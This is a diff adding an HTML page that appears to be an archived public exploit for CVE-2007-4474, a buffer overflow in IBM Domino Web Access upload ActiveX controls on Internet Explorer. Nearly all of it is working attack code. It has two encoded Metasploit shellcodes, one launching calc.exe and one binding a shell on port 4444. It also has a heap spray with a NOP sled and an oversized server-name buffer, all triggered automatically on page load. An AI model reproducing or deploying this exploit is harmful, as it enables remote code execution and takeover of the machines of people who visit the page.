@@ -1,0 +1,149 @@
+<!-- 
+written by e.b. 
+IBM Domino Web Access Upload Module Universal BoF Exploit
+CVE-2007-4474
+Tested on Windows XP SP2(fully patched) English, IE6 and IE7 
+dwa7w.dll version 7.0.34.1
+inotes6.dll version 6.0.40.0 and version 6.0.48.0
+inotes6w.dll version 6.0.48.0 
+Thanks to h.d.m. and the Metasploit crew 
+-->
+<html>
+ <head>
+  <title>IBM Domino Web Access Upload Module Universal BoF Exploit</title>
+  <script language="JavaScript" defer>
+    function Check() {
+     
+   
+
+
+// win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com 
+var shellcode1 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
+                          "%u4948%u4949%u4949%u4949%u4949%u4949%u5a51%u436a" +
+                          "%u3058%u3142%u4250%u6b41%u4142%u4253%u4232%u3241" +
+                          "%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u4d4c" +
+                          "%u6338%u7574%u3350%u6730%u4c70%u734b%u5775%u6e4c" +
+                          "%u636b%u454c%u6355%u3348%u5831%u6c6f%u704b%u774f" +
+                          "%u6e68%u736b%u716f%u6530%u6a51%u724b%u4e69%u366b" +
+                          "%u4e54%u456b%u4a51%u464e%u6b51%u4f70%u4c69%u6e6c" +
+                          "%u5964%u7350%u5344%u5837%u7a41%u546a%u334d%u7831" +
+                          "%u4842%u7a6b%u7754%u524b%u6674%u3444%u6244%u5955" +
+                          "%u6e75%u416b%u364f%u4544%u6a51%u534b%u4c56%u464b" +
+                          "%u726c%u4c6b%u534b%u376f%u636c%u6a31%u4e4b%u756b" +
+                          "%u6c4c%u544b%u4841%u4d6b%u5159%u514c%u3434%u4a44" +
+                          "%u3063%u6f31%u6230%u4e44%u716b%u5450%u4b70%u6b35" +
+                          "%u5070%u4678%u6c6c%u634b%u4470%u4c4c%u444b%u3530" +
+                          "%u6e4c%u6c4d%u614b%u5578%u6a58%u644b%u4e49%u6b6b" +
+                          "%u6c30%u5770%u5770%u4770%u4c70%u704b%u4768%u714c" +
+                          "%u444f%u6b71%u3346%u6650%u4f36%u4c79%u6e38%u4f63" +
+                          "%u7130%u306b%u4150%u5878%u6c70%u534a%u5134%u334f" +
+                          "%u4e58%u3978%u6d6e%u465a%u616e%u4b47%u694f%u6377" +
+                          "%u4553%u336a%u726c%u3057%u5069%u626e%u7044%u736f" +
+                          "%u4147%u4163%u504c%u4273%u3159%u5063%u6574%u7035" +
+                          "%u546d%u6573%u3362%u306c%u4163%u7071%u536c%u6653" +
+                          "%u314e%u7475%u7038%u7765%u4370");
+
+// win32_bind -  EXITFUNC=process LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com 
+var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
+ 			  "%u4949%u4949%u4849%u4949%u4949%u4949%u5a51%u686a" +
+ 			  "%u5058%u4230%u4131%u6b42%u4142%u4278%u4232%u3241" +
+ 			  "%u4141%u4130%u5841%u3850%u4242%u4875%u6b69%u414c" +
+ 			  "%u6a7a%u304b%u4d4d%u3838%u4b79%u494f%u4b6f%u514f" +
+ 			  "%u6e70%u506b%u666c%u6444%u6c64%u434b%u5575%u4c6c" +
+ 			  "%u334b%u654c%u5055%u5478%u5a41%u6c4f%u704b%u454f" +
+ 			  "%u4e48%u716b%u754f%u3770%u5871%u506b%u6e49%u346b" +
+ 			  "%u6e74%u366b%u4a61%u774e%u4f41%u4e30%u4c79%u4f6c" +
+			  "%u4f74%u3030%u5674%u7967%u6b51%u447a%u434d%u4931" +
+ 			  "%u7a52%u4b4b%u4544%u706b%u4154%u3134%u5238%u7955" +
+ 			  "%u6e75%u436b%u746f%u6364%u3831%u656b%u4e36%u766b" +
+ 			  "%u706c%u4c4b%u334b%u576f%u346c%u5a41%u764b%u6663" +
+ 			  "%u6e4c%u6b6b%u5039%u666c%u5744%u326c%u6f41%u4433" +
+ 			  "%u4971%u754b%u4c34%u324b%u6663%u4c50%u734b%u6670" +
+ 			  "%u4e6c%u306b%u7570%u4c4c%u4c6d%u734b%u5770%u3378" +
+ 			  "%u416e%u4c78%u724e%u466e%u386e%u706c%u5950%u696f" +
+ 			  "%u7546%u7236%u3073%u6566%u3638%u4653%u6252%u6248" +
+ 			  "%u5257%u3653%u5352%u306f%u5954%u786f%u6250%u5a48" +
+ 			  "%u486b%u4b6d%u754c%u466b%u3930%u5a6f%u6176%u4e4f" +
+ 			  "%u4d69%u3035%u6e66%u7a61%u374d%u3778%u7672%u3035" +
+ 			  "%u346a%u7942%u4e6f%u3330%u5a58%u3779%u6b79%u4c45" +
+ 			  "%u726d%u6977%u6a6f%u4376%u7063%u5353%u5363%u5163" +
+ 			  "%u4143%u7253%u7373%u6173%u6b43%u4e4f%u7330%u4356" +
+ 			  "%u5758%u7361%u536c%u7656%u4e33%u5969%u4e71%u3575" +
+ 			  "%u6938%u6534%u424a%u6f50%u3137%u6b47%u6b4f%u3066" +
+ 			  "%u726a%u3030%u6351%u4965%u386f%u5550%u6f38%u4e54" +
+ 			  "%u364d%u4d4e%u3139%u4b47%u6a4f%u6276%u7673%u6b35" +
+ 			  "%u6e4f%u5330%u5858%u5265%u6e69%u7366%u7379%u3967" +
+ 			  "%u4e6f%u7236%u7070%u6254%u7274%u5975%u586f%u4c50" +
+ 			  "%u3553%u6b38%u7157%u6f69%u3036%u6679%u7937%u6e6f" +
+ 			  "%u7036%u6b55%u6e4f%u3530%u7236%u724a%u7044%u7166" +
+ 			  "%u4278%u3243%u6e4d%u6b69%u5055%u506a%u5150%u3549" +
+ 			  "%u5a79%u4f6c%u6d79%u3337%u535a%u4d74%u7a59%u3742" +
+ 			  "%u4941%u4a50%u4e53%u6b4a%u714e%u3452%u696d%u436e" +
+ 			  "%u4472%u4d6c%u4c43%u634d%u704a%u4e38%u6e4b%u4e4b" +
+ 			  "%u454b%u7038%u6b72%u6d4e%u6563%u7946%u506f%u5075" +
+ 			  "%u5944%u696f%u5146%u624b%u6377%u3662%u4331%u6161" +
+ 			  "%u7041%u366a%u3361%u4361%u7161%u5645%u3931%u4a6f" +
+ 			  "%u3270%u4e48%u5a4d%u3379%u5835%u614e%u3943%u4b6f" +
+ 			  "%u7366%u6b5a%u6b4f%u544f%u7977%u386f%u6c50%u534b" +
+ 			  "%u5967%u4d6c%u4f53%u4234%u4b44%u494f%u5146%u5942" +
+ 			  "%u586f%u5550%u3338%u394e%u6948%u4372%u6643%u4933" + 
+			  "%u396f%u6946%u586f%u6850");
+
+
+	var bigblock = unescape("%u9090%u9090");
+	var headersize = 20;
+	var slackspace = headersize + shellcode1.length;
+	while (bigblock.length < slackspace) bigblock += bigblock;
+	var fillblock = bigblock.substring(0,slackspace);
+	var block = bigblock.substring(0,bigblock.length - slackspace);
+	while (block.length + slackspace < 0x40000) block = block + block + fillblock;
+
+	
+
+	var memory = new Array();
+	for (i = 0; i < 400; i++){ memory[i] = block + shellcode1 }
+	
+		
+
+	try {
+		dwa7w.General_ServerName = makeBuf(1);
+	  	dwa7w.InstallBrowserHelperDll();
+
+		inotes6.General_ServerName = makeBuf(1); //switch to 0 for inotes6
+	  	inotes6.InstallBrowserHelperDll();
+	    } catch(err) {}	
+
+	
+ } 
+
+ function makeBuf(unicode) {
+	
+	var junk = ""
+	for (i = 0; i < 2000; i++) { junk = junk + unescape("%u4141") }
+
+	var jmp = ""
+	
+ 	if (unicode == 1) {
+		for (i = 0; i < 900; i++) { jmp = jmp + unescape("%u0E0E") }
+					
+	} else {	
+		for (i = 0; i < 900; i++) { jmp = jmp + unescape("%0E%0E") }
+	}
+
+	var m = junk + jmp;		
+	return m;
+ }
+   
+   </script>
+  </head>
+ <body onload="JavaScript: return Check();">
+	<object id="dwa7w" classid="clsid:E008A543-CEFB-4559-912F-C27C2B89F13B">
+		Unable to create object
+	</object>
+	<object id="inotes6" classid="clsid:3BFFE033-BF43-11D5-A271-00A024A51325">
+		Unable to create object
+	</object>
+ </body>
+</html>
+
+# milw0rm.com [2008-02-13]
